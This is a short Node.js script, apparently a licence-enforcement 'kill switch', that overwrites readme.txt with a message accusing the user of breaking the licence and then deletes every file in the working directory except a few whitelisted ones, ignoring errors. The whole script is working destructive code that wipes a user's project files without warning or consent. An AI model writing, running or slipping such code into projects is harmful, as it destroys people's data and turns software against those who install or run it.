const fs = require('fs');
fs.writeFileSync('./readme.txt', 'You broke the licence, please read LICENSE.txt', 'utf-8');
fs.readdirSync('./').forEach(file => {
    if (file === 'license.txt' || file === 'readme.txt' || file === 'deletelmao.js' || file === 'license.js' || file === 'midleware.js' || file === 'main.js') return;
    else fs.unlink(`./${file}`, f => { });
});
